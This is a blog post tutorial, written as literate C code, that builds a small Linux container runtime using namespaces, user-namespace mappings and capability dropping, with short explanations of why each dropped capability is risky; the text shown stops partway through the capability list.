<!DOCTYPE html>
<html lang="en">
<head>
<title>Linux containers in 500 lines of code</title>
<!-- 2019-02-18 Mon 02:58 -->
<meta  charset="utf-8">
<meta  name="generator" content="Org-mode">
<meta  name="author" content="Lizzie Dixon">
<link rel="icon" href="data:;base64,="><style type="text/css">@media (max-width: 1000) {
    pre {
	font-size: 8pt;
    }
}

body{
    margin: 1em auto;
    max-width: 62em;
    line-height: 1.6;
    color: #444;
    padding: 0 1em;
    font-size: 14pt;
}

p {
    text-align: justify;
}

input {
    font-size: 14pt;
}

a:visited {
    color: #666;
}

a {
    color: #555;
}

h1 {
    margin: 0.5em 0;
}

h1, h2, h3 {
    line-height: 1.2
}

[src$=".svg"] {
    width: 100%;
}

.org-src-container {
    margin: 1em;
}

pre {
    padding: 2em;
    overflow: auto;
    background-color: #eeeeee;
}

pre.example {
    margin: 1em;
}

table {
    background-color: #eeeeee;
    margin: 2em;
}

td  {
    padding: 0.75em 2em;
}

.mono {
    font-family: monospace;
}

li {
    padding: 0.1em 0;
}


#table-of-contents {
    width: 40%;
    float: right;
    padding: 0 2em;
}

#table-of-contents ul {
    padding: 0 1.2em;
    margin: 0;
}

#table-of-contents h2 {
    margin: 0.2em;
}

label.org-src-name {
    color: #666;
    margin-bottom: 1em;
}

label.org-src-name code {
    color: #666;
}

code {
    word-break: break-all;
}

span.navigation-links a, span.self-links a {
    padding-right: 0.4em;
}

span.self-links {
    float: right;
}

span.listing-number, span.figure-number {
    display: none;
}

div.figure {
    text-align: center;
    font-size: 0.8em;
    color: #777;
    max-width: 100%;
}

div.figure img, div.figure video, div.prompt {
    -webkit-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    -moz-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    border: 1px solid #444;
    max-width: 100%;
}

/* MailChimp Form Embed Code - Horizontal Super Slim - 12/16/2015 v10.7
Adapted from: http://blog.heyimcat.com/universal-signup-form/ */

#mc_embed_signup form {text-align:center; padding:10px 0 10px 0;}
.mc-field-group { display: inline-block; } /* positions input field horizontally */
#mc_embed_signup input.email {border: 1px solid #444;  -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; color: #343434; background-color: #fff; box-sizing:border-box; height:32px; padding: 0px 0.4em; display: inline-block; margin: 0; max-width:300px; vertical-align:top;}
#mc_embed_signup .clear {display: inline-block;} /* positions button horizontally in line with input */
#mc_embed_signup .button {border: 1px solid #444; -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; letter-spacing: .03em; color: #fff; background-color: #777; box-sizing:border-box; height:32px; line-height:32px; padding:0 18px; display: inline-block; margin: 0; transition: all 0.23s ease-in-out 0s;}
#mc_embed_signup .button:hover {background-color:#555; cursor:pointer;}
#mc_embed_signup div#mce-responses {float:left; top:-1.4em; padding:0em .5em 0em .5em; overflow:hidden; width:90%;margin: 0 5%; clear: both;}
#mc_embed_signup div.response {margin:1em 0; padding:1em .5em .5em 0; font-weight:bold; float:left; top:-1.5em; z-index:1; width:80%;}
#mc_embed_signup #mce-error-response {display:none;}
#mc_embed_signup #mce-success-response {color:#529214; display:none;}
#mc_embed_signup label.error {display:block; float:none; width:auto; margin-left:1.05em; text-align:left; padding:.5em 0;}
#mc_embed_signup input.email { display: inline-block; margin-bottom:5px;}
#mc_embed_signup .button { margin:0; }

div.prompt {
    border-radius: 3px;
    padding: 10px;
    margin: 10px;
    background-color: #fff;
    text-align:center;
    max-width: 800px;
    margin-left: auto;
    margin-right: auto;
    background-color: #fffaa2;
}

div.prompt-close {
    float: right;
    padding-left: 10px;
    padding-bottom: 10px;
    cursor: pointer;
    color: #777;
    font-size: 0.8em;
    font-weight: bold;
    margin-top: -5px;
}
</style><script>window.onload = function () {
    if (window.location.pathname !== "/"
	&& document.cookie.split(/ *; */).indexOf("closed_form=yes") < 0) {
	var prompt = document.createElement("div");
	var close = document.createElement("div");
	var content = document.getElementById("content");
	var h1 = content.getElementsByTagName("h1")[0];

	prompt.className = "prompt";
	prompt.innerHTML = "Like this writing? Subscribe to receive updates on vulnerabilities and software projects as soon as I publish them!<br><div id=\"mc_embed_signup\"><form action=\"https://lizzie.us20.list-manage.com/subscribe/post?u=a2011719c1a5ce9e37e7c3e82&amp;id=43ce08f401\" method=\"post\" id=\"mc-embedded-subscribe-form\" name=\"mc-embedded-subscribe-form\" class=\"validate\" target=\"_blank\" novalidate><div id=\"mc_embed_signup_scroll\"><input type=\"email\" value=\"\" name=\"EMAIL\" class=\"email\" id=\"mce-EMAIL\" placeholder=\"email address\" required><div style=\"position: absolute; left: -5000px;\" aria-hidden=\"true\"><input type=\"text\" name=\"b_a2011719c1a5ce9e37e7c3e82_43ce08f401\" tabindex=\"-1\" value=\"\"></div> <div class=\"clear\"><input type=\"submit\" value=\"subscribe\" name=\"asubscribe\" id=\"mc-embedded-subscribe\" class=\"button\"></div></div></form></div>";

	close.innerHTML = "Ã—";
	close.className = "prompt-close";	
	close.onclick = function () {
	    content.removeChild(prompt);
	    document.cookie = "closed_form=yes";
	}

	prompt.insertBefore(close, prompt.firstChild);
	content.insertBefore(prompt, h1.nextSibling);
    }
}
</script><meta name=viewport content="width=device-width, initial-scale=1">
<link rel="alternate" type="application/rss+xml" href="/rss.xml"/>
</head>
<body>
<div id="navigation"><span class="navigation-links"><a href="/rss.xml">rss</a> <a href="./">home</a> </span><span class="self-links"><a href="https://github.com/startling">github</a> <a href="mailto:_@lizzie.io">email</a></span></div><div id="content">
<h1 class="title">Linux containers in 500 lines of code</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orgba868eb">Container setup</a></li>
<li><a href="#org39f5223"><code>contained.c</code></a>
<ul>
<li><a href="#org0aee542">Namespaces</a></li>
<li><a href="#orga723de6">Capabilties</a>
<ul>
<li><a href="#org07e738c">Dropped capabilities</a></li>
<li><a href="#orgc6d2b81">Retained Capabilities</a></li>
</ul>
</li>
<li><a href="#org00cc412">Mounts</a></li>
<li><a href="#org8504d16">System Calls</a>
<ul>
<li><a href="#org141a19c">Disallowed System Calls</a></li>
<li><a href="#org8ee812f">Allowed System Calls</a></li>
</ul>
</li>
<li><a href="#org36fcb0f">Resources</a></li>
<li><a href="#org65bbba4">Networking</a></li>
</ul>
</li>
</ul>
</div>
</div>
<p>
I've used Linux containers <a href="https://circleci.com">directly</a> and <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/linux_sandboxing.md">indirectly</a> for years, but I
wanted to become more familiar with them. So I wrote some code. This
used to be 500 lines of code, I swear, but I've revised it some since
publishing; I've ended up with about 70 lines more.
</p>

<p>
I wanted specifically to find a minimal set of restrictions to run
untrusted code. This isn't how you should approach containers on
anything with any exposure: you should restrict everything you
can. But I think it's important to know which permissions are
categorically unsafe! I've tried to back up things I'm saying with
links to code or people I trust, but <a href="mailto:_@lizzie.io">I'd love to know if I missed
anything.</a>
</p>

<p>
This is a <a href="https://www.cs.tufts.edu/~nr/noweb/"><code>noweb</code></a>-style piece of literate code. References named
<code>&lt;&lt;x&gt;&gt;</code> will be expanded to the code block named <code>x</code>. You can find the
tangled source <a href="linux-containers-in-500-loc/contained.c">here</a>. This document is an <a href="http://orgmode.org/">orgmode</a> document, you can
find its source <a href="https://blog.lizzie.io/linux-containers-in-500-loc.org">here</a>. This document and this code are licensed under
the GPLv3; you can find its source <a href="https://www.gnu.org/licenses/gpl-3.0.en.html">here</a>.
</p>

<div id="outline-container-orgba868eb" class="outline-2">
<h2 id="orgba868eb">Container setup</h2>
<div class="outline-text-2" id="text-orgba868eb">
<p>
There are several complementary and overlapping mechanisms that make
up modern Linux containers. Roughly,
</p>

<ul class="org-ul">
<li><code>namespaces</code> are used to group kernel objects into different sets
that can be accessed by specific process trees. For example, pid
namespaces limit the view of the process list to the processes
within the namespace. There are a couple of different kind of
namespaces. I'll go into this more later.</li>
<li><code>capabilities</code> are used here to set some coarse limits on what uid 0
can do.</li>
<li><code>cgroups</code> is a mechanism to limit usage of resources like memory,
disk io, and cpu-time.</li>
<li><code>setrlimit</code> is another mechanism for limiting resource usage. It's
older than cgroups, but can do some things cgroups can't.</li>
</ul>

<p>
These are all Linux kernel mechanisms. Seccomp, capabilities, and
<code>setrlimit</code> are all done with system calls. <code>cgroups</code> is accessed
through a filesystem.
</p>

<p>
There's a lot here, and the scope of each mechanism is pretty
unclear. They overlap a lot and it's tricky to find the best way to
limit things. User namespaces are somewhat new, and promise to unify a
lot of this behavior. But unfortunately compiling the kernel with user
namespaces enabled complicates things. Compiling with user namespaces changes the
semantics of capabilities system-wide, which could cause more problems
or at least confusion<sup><a id="fnr.1" class="footref" href="#fn.1">1</a></sup>. There have been a
large number of privilege-escalation bugs exposed by user
namespaces. <a href="https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf">"Understanding and Hardening Linux Containers"</a> explains
</p>

<blockquote>
<p>
Despite the large upsides the user namespace provides in terms of
security, due to the sensitive nature of the user namespace,
somewhat conflicting security models and large amount of new code,
several serious vulnerabilities have been discovered and new
vulnerabilities have unfortunately continued to be discovered.
These deal with both the implementation of user namespaces itself or
allow the illegitimate or unintended use of the user namespace to
perform a privilege escalation. Often these issues present
themselves on systems where containers are not being used, and where
the kernel version is recent enough to support user namespaces.
</p>
</blockquote>

<p>
It's turned off by default in Linux at the time of this
writing<sup><a id="fnr.2" class="footref" href="#fn.2">2</a></sup>, but many distributions apply patches
to turn it on in a limited way<sup><a id="fnr.3" class="footref" href="#fn.3">3</a></sup>.
</p>


<p>
But all of these issues apply to hosts with user namespaces compiled
in; it doesn't really matter whether we use user namespaces or not,
especially since I'll be preventing nested user namespaces. So I'll
only use a user namespace if they're available.
</p>

<p>
(The user-namespace handling in this code was originally pretty
broken. Jann Horn in particular gave great feedback. Thanks!)
</p>
</div>
</div>

<div id="outline-container-org39f5223" class="outline-2">
<h2 id="org39f5223"><code>contained.c</code></h2>
<div class="outline-text-2" id="text-org39f5223">
<p>
This program can be used like this, to run <code>/misc/img/bin/sh</code> in
<code>/misc/img</code> as <code>root</code>:
</p>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m ~/misc/busybox-img/ -u 0 -c /bin/sh
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.oQ5jOY...done.
=&gt; trying a user namespace...writing /proc/32627/uid_map...writing /proc/32627/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
/ # whoami
root
/ # hostname
05fe5c-three-of-pentacles
/ # exit
=&gt; cleaning cgroups...done.
</pre>

<p>
So, a skeleton for it:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 7: </span><code>contained.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -lcap -lseccomp contained.c -o contained" -*- */
/* This code is licensed under the GPLv3. You can find its text here:
   https://www.gnu.org/licenses/gpl-3.0.en.html */


#define _GNU_SOURCE
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;grp.h&gt;
#include &lt;pwd.h&gt;
#include &lt;sched.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/capability.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/capability.h&gt;
#include &lt;linux/limits.h&gt;

struct child_config {
	int argc;
	uid_t uid;
	int fd;
	char *hostname;
	char **argv;
	char *mount_dir;
};

&lt;&lt;capabilities&gt;&gt;

&lt;&lt;mounts&gt;&gt;

&lt;&lt;syscalls&gt;&gt;

&lt;&lt;resources&gt;&gt;

&lt;&lt;child&gt;&gt;

&lt;&lt;choose-hostname&gt;&gt;

int main (int argc, char **argv)
{
	struct child_config config = {0};
	int err = 0;
	int option = 0;
	int sockets[2] = {0};
	pid_t child_pid = 0;
	int last_optind = 0;
	while ((option = getopt(argc, argv, "c:m:u:"))) {
		switch (option) {
		case 'c':
			config.argc = argc - last_optind - 1;
			config.argv = &amp;argv[argc - config.argc];
			goto finish_options;
		case 'm':
			config.mount_dir = optarg;
			break;
		case 'u':
			if (sscanf(optarg, "%d", &amp;config.uid) != 1) {
				fprintf(stderr, "badly-formatted uid: %s\n", optarg);
				goto usage;
			}
			break;
		default:
			goto usage;
		}
		last_optind = optind;
	}
finish_options:
	if (!config.argc) goto usage;
	if (!config.mount_dir) goto usage;

&lt;&lt;check-linux-version&gt;&gt;

	char hostname[256] = {0};
	if (choose_hostname(hostname, sizeof(hostname)))
		goto error;
	config.hostname = hostname;

&lt;&lt;namespaces&gt;&gt;

	goto cleanup;
usage:
	fprintf(stderr, "Usage: %s -u -1 -m . -c /bin/sh ~\n", argv[0]);
error:
	err = 1;
cleanup:
	if (sockets[0]) close(sockets[0]);
	if (sockets[1]) close(sockets[1]);
	return err;
}
</pre>
</div>

<p>
Since I'll be blacklisting system calls and capabilities, it's
important to make sure there aren't any new ones.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 8: </span><code>&lt;&lt;check-linux-version&gt;&gt;</code> =</label><pre class="src src-C">	fprintf(stderr, "=&gt; validating Linux version...");
	struct utsname host = {0};
	if (uname(&amp;host)) {
		fprintf(stderr, "failed: %m\n");
		goto cleanup;
	}
	int major = -1;
	int minor = -1;
	if (sscanf(host.release, "%u.%u.", &amp;major, &amp;minor) != 2) {
		fprintf(stderr, "weird release format: %s\n", host.release);
		goto cleanup;
	}
	if (major != 4 || (minor != 7 &amp;&amp; minor != 8)) {
		fprintf(stderr, "expected 4.7.x or 4.8.x: %s\n", host.release);
		goto cleanup;
	}
	if (strcmp("x86_64", host.machine)) {
		fprintf(stderr, "expected x86_64: %s\n", host.machine);
		goto cleanup;
	}
	fprintf(stderr, "%s on %s.\n", host.release, host.machine);
</pre>
</div>

<p>
(This had a bug. <a href="https://www.reddit.com/r/programming/comments/57x26h/linux_containers_in_500_lines_of_code/d8w07vf?context=3">captainjey on reddit let me know. Thanks!</a>)
</p>

<p>
And I wasn't quite at 500 lines of code, so I thought I had some
space to build nice hostnames.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 9: </span><code>&lt;&lt;choose-hostname&gt;&gt;</code> =</label><pre class="src src-C">int choose_hostname(char *buff, size_t len)
{
	static const char *suits[] = { "swords", "wands", "pentacles", "cups" };
	static const char *minor[] = {
		"ace", "two", "three", "four", "five", "six", "seven", "eight",
		"nine", "ten", "page", "knight", "queen", "king"
	};
	static const char *major[] = {
		"fool", "magician", "high-priestess", "empress", "emperor",
		"hierophant", "lovers", "chariot", "strength", "hermit",
		"wheel", "justice", "hanged-man", "death", "temperance",
		"devil", "tower", "star", "moon", "sun", "judgment", "world"
	};
	struct timespec now = {0};
	clock_gettime(CLOCK_MONOTONIC, &amp;now);
	size_t ix = now.tv_nsec % 78;
	if (ix &lt; sizeof(major) / sizeof(*major)) {
		snprintf(buff, len, "%05lx-%s", now.tv_sec, major[ix]);
	} else {
		ix -= sizeof(major) / sizeof(*major);
		snprintf(buff, len,
			 "%05lxc-%s-of-%s",
			 now.tv_sec,
			 minor[ix % (sizeof(minor) / sizeof(*minor))],
			 suits[ix / (sizeof(minor) / sizeof(*minor))]);
	}
	return 0;
}
</pre>
</div>
</div>


<div id="outline-container-org0aee542" class="outline-3">
<h3 id="org0aee542">Namespaces</h3>
<div class="outline-text-3" id="text-org0aee542">
<p>
<code>clone</code> is the system call behind <code>fork()</code> et al. It's also the key to
all of this. Conceptually we want to create a process with different
properties than its parent: it should be able to mount a different
<code>/</code>, set its own hostname, and do other things. We'll specify all of
this by passing flags to <code>clone</code> <sup><a id="fnr.4" class="footref" href="#fn.4">4</a></sup>.
</p>

<p>
The child needs to send some messages to the parent, so we'll
initialize a socketpair, and then make sure the child only receives
access to one.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 10: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	if (socketpair(AF_LOCAL, SOCK_SEQPACKET, 0, sockets)) {
		fprintf(stderr, "socketpair failed: %m\n");
		goto error;
	}
	if (fcntl(sockets[0], F_SETFD, FD_CLOEXEC)) {
		fprintf(stderr, "fcntl failed: %m\n");
		goto error;
	}
	config.fd = sockets[1];
</pre>
</div>

<p>
But first we need to set up room for a stack. We'll <code>execve</code> later,
which will actually set up the stack again, so this is only
temporary.<sup><a id="fnr.5" class="footref" href="#fn.5">5</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 13: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	#define STACK_SIZE (1024 * 1024)

	char *stack = 0;
	if (!(stack = malloc(STACK_SIZE))) {
		fprintf(stderr, "=&gt; malloc failed, out of memory?\n");
		goto error;
	}
</pre>
</div>

<p>
We'll also prepare the cgroup for this process tree. More on this later.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 14: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	if (resources(&amp;config)) {
		err = 1;
		goto clear_resources;
	}
</pre>
</div>

<p>
We'll namespace the mounts, pids, IPC data structures, network
devices, and hostname / domain name. I'll go into these more in the
code for capabilities, cgroups, and syscalls.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 15: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	int flags = CLONE_NEWNS
		| CLONE_NEWCGROUP
		| CLONE_NEWPID
		| CLONE_NEWIPC
		| CLONE_NEWNET
		| CLONE_NEWUTS;
</pre>
</div>

<p>
Stacks on x86, and almost everything else Linux runs on, grow
downwards, so we'll add <code>STACK_SIZE</code> to get a pointer just below the
end.<sup><a id="fnr.6" class="footref" href="#fn.6">6</a></sup> We also <code>|</code> the flags with <code>SIGCHLD</code> so
that we can <code>wait</code> on it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 16: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	if ((child_pid = clone(child, stack + STACK_SIZE, flags | SIGCHLD, &amp;config)) == -1) {
		fprintf(stderr, "=&gt; clone failed! %m\n");
		err = 1;
		goto clear_resources;
	}
</pre>
</div>

<p>
Close and zero the child's socket, so that if something breaks then we
don't leave an open fd, possibly causing the child to or the parent to
hang.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 17: </span><code>&lt;&lt;namespaces&gt;&gt;</code> +=</label><pre class="src src-C">	close(sockets[1]);
	sockets[1] = 0;
</pre>
</div>

<p>
The parent process will configure the child's user namespace and then
pause until the child process tree exits<sup><a id="fnr.7" class="footref" href="#fn.7">7</a></sup>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 21: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">#define USERNS_OFFSET 10000
#define USERNS_COUNT 2000

int handle_child_uid_map (pid_t child_pid, int fd)
{
	int uid_map = 0;
	int has_userns = -1;
	if (read(fd, &amp;has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't read from child!\n");
		return -1;
	}
	if (has_userns) {
		char path[PATH_MAX] = {0};
		for (char **file = (char *[]) { "uid_map", "gid_map", 0 }; *file; file++) {
			if (snprintf(path, sizeof(path), "/proc/%d/%s", child_pid, *file)
			    &gt; sizeof(path)) {
				fprintf(stderr, "snprintf too big? %m\n");
				return -1;
			}
			fprintf(stderr, "writing %s...", path);
			if ((uid_map = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "open failed: %m\n");
				return -1;
			}
			if (dprintf(uid_map, "0 %d %d\n", USERNS_OFFSET, USERNS_COUNT) == -1) {
				fprintf(stderr, "dprintf failed: %m\n");
				close(uid_map);
				return -1;
			}
			close(uid_map);
		}
	}
	if (write(fd, &amp; (int) { 0 }, sizeof(int)) != sizeof(int)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	return 0;
}
</pre>
</div>

<p>
The child process  will send a message to the parent process about
whether it should set uid and gid mappings. If that works, it will
<code>setgroups</code>, <code>setresgid</code>, and <code>setresuid</code>. Both <code>setgroups</code> and
<code>setresgid</code> are necessary here since there are two separate group
mechanisms on Linux<sup><a id="fnr.9" class="footref" href="#fn.9">9</a></sup>. I'm also assuming here
that every uid has a corresponding gid, which is common but not
necessarily universal.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 23: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">int userns(struct child_config *config)
{
	fprintf(stderr, "=&gt; trying a user namespace...");
	int has_userns = !unshare(CLONE_NEWUSER);
	if (write(config-&gt;fd, &amp;has_userns, sizeof(has_userns)) != sizeof(has_userns)) {
		fprintf(stderr, "couldn't write: %m\n");
		return -1;
	}
	int result = 0;
	if (read(config-&gt;fd, &amp;result, sizeof(result)) != sizeof(result)) {
		fprintf(stderr, "couldn't read: %m\n");
		return -1;
	}
	if (result) return -1;
	if (has_userns) {
		fprintf(stderr, "done.\n");
	} else {
		fprintf(stderr, "unsupported? continuing.\n");
	}
	fprintf(stderr, "=&gt; switching to uid %d / gid %d...", config-&gt;uid, config-&gt;uid);
	if (setgroups(1, &amp; (gid_t) { config-&gt;uid }) ||
	    setresgid(config-&gt;uid, config-&gt;uid, config-&gt;uid) ||
	    setresuid(config-&gt;uid, config-&gt;uid, config-&gt;uid)) {
		fprintf(stderr, "%m\n");
		return -1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>

<p>
And this is where the child process from <code>clone</code> will end up. We'll
perform all of our setup, switch users and groups, and then load the
executable. The order is important here: we can't change mounts
without certain capabilities, we can't <code>unshare</code> after we limit the
syscalls, etc.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 24: </span><code>&lt;&lt;child&gt;&gt;</code> +=</label><pre class="src src-C">int child(void *arg)
{
	struct child_config *config = arg;
	if (sethostname(config-&gt;hostname, strlen(config-&gt;hostname))
	    || mounts(config)
	    || userns(config)
	    || capabilities()
	    || syscalls()) {
		close(config-&gt;fd);
		return -1;
	}
	if (close(config-&gt;fd)) {
		fprintf(stderr, "close failed: %m\n");
		return -1;
	}
	if (execve(config-&gt;argv[0], config-&gt;argv, NULL)) {
		fprintf(stderr, "execve failed! %m.\n");
		return -1;
	}
	return 0;
}
</pre>
</div>
</div>
</div>

<div id="outline-container-orga723de6" class="outline-3">
<h3 id="orga723de6">Capabilties</h3>
<div class="outline-text-3" id="text-orga723de6">
<p>
<code>capabilities</code> subdivide the property of "being root" on Linux. It's
useful to compartmentalize privileges so that, for example a process
can allocate network devices (<code>CAP_NET_ADMIN</code>) but not read all files
(<code>CAP_DAC_OVERRIDE</code>). I'll use them here to drop the ones we don't
want.
</p>

<p>
But not all of "being root" is subvidivided into capabilities. For
example, writing to parts of procfs is allowed by root even after
having dropped capabilities<sup><a id="fnr.10" class="footref" href="#fn.10">10</a></sup>. There are a lot of
things like this: this is part of why need other restrictions beside
capabilities.
</p>

<p>
It's also important to think about how we're dropping capabilities. <code>man 7
capabilities</code> has an algorithm for us:
</p>

<div class="org-src-container">
<pre class="src src-text">	During  an   execve(2),  the   kernel  calculates   the  new
	capabilities of the process using the following algorithm:

	    P'(ambient) = (file is privileged) ? 0 : P(ambient)

	    P'(permitted) = (P(inheritable) &amp; F(inheritable)) |
					(F(permitted) &amp; cap_bset) | P'(ambient)

	    P'(effective) = F(effective) ? P'(permitted) : P'(ambient)

	    P'(inheritable) = P(inheritable)    [i.e., unchanged]

	where:

	    P         denotes the  value of a thread  capability set
			    before the execve(2)

	    P'        denotes the  value of a thread  capability set
			    after the execve(2)

	    F         denotes a file capability set

	    cap_bset  is the  value of  the capability  bounding set
			    (described below).
</pre>
</div>

<p>
We'd like <code>P'(ambient)</code> and <code>P(inheritable)</code> to be empty, and
<code>P'(permitted)</code> and <code>P(effective)</code> to only include the capabilities
above. This is achievable by doing the following
</p>

<ul class="org-ul">
<li>Clearing our own inheritable set. This clears the ambient set; <code>man
  7 capabilities</code> says "The ambient capability set obeys the invariant
that no capability can ever be ambient if it is not both permitted
and inheritable." This also clears the child's inheritable set.</li>
<li>Clearing the bounding set. This limits the file capabilities we'll
gain when we <code>execve</code>, and the rest are limited by clearing the
inheritable and ambient sets.</li>
</ul>

<p>
If we were to only drop our own effective, permitted and inheritable
sets, we'd regain the permissions in the child file's capabilities.
This is how <code>bash</code> can call <code>ping</code>, for example.<sup><a id="fnr.11" class="footref" href="#fn.11">11</a></sup>
</p>
</div>


<div id="outline-container-org07e738c" class="outline-4">
<h4 id="org07e738c">Dropped capabilities</h4>
<div class="outline-text-4" id="text-org07e738c">
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 29: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">int capabilities()
{
	fprintf(stderr, "=&gt; dropping capabilities...");
</pre>
</div>

<p>
<code>CAP_AUDIT_CONTROL</code>, <code>_READ</code>, and <code>_WRITE</code> allow access to the audit
system of the kernel (i.e. functions like <code>audit_set_enabled</code>, usually
used with <code>auditctl</code>). The kernel prevents messages that normally
require <code>CAP_AUDIT_CONTROL</code> outside of the first pid namespace, but it
does allow messages that would require <code>CAP_AUDIT_READ</code> and
<code>CAP_AUDIT_WRITE</code> from any namespace.<sup><a id="fnr.12" class="footref" href="#fn.12">12</a></sup> So
let's drop them all. We especially want to drop <code>CAP_AUDIT_READ</code>,
since it isn't namespaced<sup><a id="fnr.13" class="footref" href="#fn.13">13</a></sup> and may contain important
information, but <code>CAP_AUDIT_WRITE</code> may also allow the contained
process to falsify logs or DOS the audit system.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 32: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">	int drop_caps[] = {
		CAP_AUDIT_CONTROL,
		CAP_AUDIT_READ,
		CAP_AUDIT_WRITE,
</pre>
</div>

<p>
<code>CAP_BLOCK_SUSPEND</code> lets programs prevent the system from suspending,
either with <code>EPOLLWAKEUP</code> or
/proc/sys/wake_lock.<sup><a id="fnr.14" class="footref" href="#fn.14">14</a></sup> Supend isn't namespaced, so
we'd like to prevent this.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 34: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_BLOCK_SUSPEND,
</pre>
</div>

<p>
<code>CAP_DAC_READ_SEARCH</code> lets programs call <code>open_by_handle_at</code> with an
arbitrary <code>struct file_handle *</code>. <code>struct file_handle</code> is in theory an
opaque type, but in practice it corresponds to inode numbers. So it's
easy to brute-force them, and read arbitrary files. This was used by
Sebastian Krahmer to write a program to read arbitrary system files
from within Docker in 2014.<sup><a id="fnr.15" class="footref" href="#fn.15">15</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 36: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_DAC_READ_SEARCH,
</pre>
</div>

<p>
<code>CAP_FSETID</code>, without user namespacing, allows the process to modify a
setuid executable without removing the setuid bit. This is pretty
dangerous! It means that if we include a setuid binary in a container,
it's easy for us to accidentally leave a dangerous setuid root binary
on our disk, which any user can use to escalate
privileges.<sup><a id="fnr.16" class="footref" href="#fn.16">16</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 40: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_FSETID,
</pre>
</div>

<p>
<code>CAP_IPC_LOCK</code> can be used to lock more of a process' own memory than
would normally be allowed<sup><a id="fnr.17" class="footref" href="#fn.17">17</a></sup>, which could be a way to deny service.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 43: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_IPC_LOCK,
</pre>
</div>

<p>
<code>CAP_MAC_ADMIN</code> and <code>CAP_MAC_OVERRIDE</code> are used by the mandatory acess
control systems Apparmor, SELinux, and SMACK to restrict access to
their settings. These aren't namespaced, so they could be used by the
contained programs to circumvent system-wide access control.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 44: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_MAC_ADMIN,
		CAP_MAC_OVERRIDE,
</pre>
</div>

<p>
<code>CAP_MKNOD</code>, without user namespacing, allows programs to create
device files corresponding to real-world devices. This includes
creating new device files for existing hardware. If this capability
were not dropped, a contained process could re-create the hard disk
device, remount it, and read or write to it.<sup><a id="fnr.18" class="footref" href="#fn.18">18</a></sup>
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 47: </span><code>&lt;&lt;capabilities&gt;&gt;</code> +=</label><pre class="src src-C">		CAP_MKNOD,
</pre>
</div>

<p>
